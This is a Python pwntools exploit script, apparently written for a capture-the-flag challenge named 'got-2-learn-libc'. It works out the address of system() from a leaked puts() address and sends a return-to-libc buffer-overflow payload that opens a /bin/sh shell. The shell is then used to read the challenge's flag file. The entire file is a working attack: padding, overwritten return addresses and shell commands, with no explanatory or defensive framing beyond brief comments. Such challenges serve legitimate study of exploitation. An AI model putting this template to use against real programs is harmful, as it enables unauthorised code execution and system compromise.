#!/usr/bin/env python

from pwn import *
import re

elf_location = '/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/'
elf = ELF(elf_location + '/vuln')
proc = elf.process()

# get the address offset between puts() and system() in gdb
gdb_puts = 0xf75f0140
gdb_system = 0xf75cb940
offset = gdb_puts - gdb_system

# the actual runtime address of puts() is already given
output = proc.recv()
bin_sh = int(re.findall('useful_string: (.*)', output)[0], 16)
runtime_puts = int(re.findall('puts: (.*)', output)[0], 16)
runtime_system = runtime_puts - offset

print('[*] puts() is at: ' + hex(runtime_puts))
print('[*] system() is at: ' + hex(runtime_system))

payload = 40 * 4 * 'A'
payload += p32(runtime_system) # current function's return address, i.e., system()
payload += 'AAAA' # system()'s return address, we don't care about this shit
payload += p32(bin_sh) # system()'s first arg, i.e., "/bin/sh"

print('[*] serving payload')
proc.sendline(payload)
proc.sendline('cat {}/flag.txt'.format(elf_location))
proc.interactive()
